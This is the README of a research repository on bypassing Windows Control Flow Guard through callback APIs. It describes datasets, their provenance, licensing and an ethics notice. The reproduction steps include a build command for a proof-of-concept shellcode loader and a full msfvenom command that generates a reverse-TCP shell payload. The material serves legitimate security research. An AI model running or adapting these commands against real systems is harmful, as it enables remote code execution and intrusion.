# cfg-callback-audit

Research data and reproduction materials for:

**Systematic Evaluation of Windows Callback APIs for Control Flow Guard Bypass**  
Qi Han, Inner Mongolia University

## Repository layout

```
cfg-callback-audit/
├── README.md
├── data/
│   ├── empirical_results.csv              # 7 APIs — empirical CFG test outcomes
│   ├── callback_audit_high_priority.csv     # 33 APIs — predicted enforcement (Appendix B)
│   ├── callback_audit_full_catalog.csv      # 157 entries — MinGW header scan catalog
│   ├── mingw_header_scan_raw.txt            # Raw scan log (headers, line numbers, signatures)
│   └── README.md
└── supplementary/
    ├── README.txt
    └── loader_*.cpp                         # PoC loaders (research reproduction only)
```

## Data provenance

| File | Source |
|------|--------|
| `empirical_results.csv` | Standardized CFG tests on Windows 10 Build 22631 (Table 6 in manuscript) |
| `callback_audit_high_priority.csv` | Curated high-priority subset with predicted categories (Appendix B) |
| `callback_audit_full_catalog.csv` | Automated regex scan of MinGW-W64 user-mode headers (2026-06-09) |
| `mingw_header_scan_raw.txt` | Complete raw output of the header scan (62 target headers, 157 matches) |

**Note:** The full catalog scan covers 62 user-mode API headers and reports 157 callback-related typedef/API entries. The manuscript additionally reports aggregate statistics from a broader WinSDK header survey (1,483 files, 87 callback types, 156 API functions). Both datasets are provided for transparency and reproduction.

## Reproduce empirical tests

1. Windows 10/11 x64, CFG enabled (Exploit Guard default).
2. Build a loader: `g++ -o loader.exe loader_callwindowproc.cpp -luser32 -lkernel32`
3. Generate shellcode: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o tcp_windows_amd64.bin`
4. Run **only on an isolated laboratory machine** you own.

## Ethics

Provided solely to reproduce academic findings and evaluate defensive mitigations.  
**Do not use against systems without explicit authorization.**

## License

- Dataset (CSV/TXT): [CC-BY 4.0](https://creativecommons.org/licenses/by/4.0/)
- Code (`supplementary/`): MIT License

## Citation

If you use this repository, cite the parent article (DOI to be assigned upon publication).
